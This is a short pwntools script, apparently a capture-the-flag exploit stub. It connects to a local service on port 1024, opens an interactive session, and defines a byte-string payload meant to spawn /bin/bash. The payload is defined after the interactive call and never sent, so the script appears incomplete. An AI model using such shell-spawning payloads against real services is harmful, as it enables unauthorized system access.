from pwn import *

r = remote('localhost', 1024)

print(r.recvline())
r.interactive()

toWrite = b"\x08bin/bash\nbash"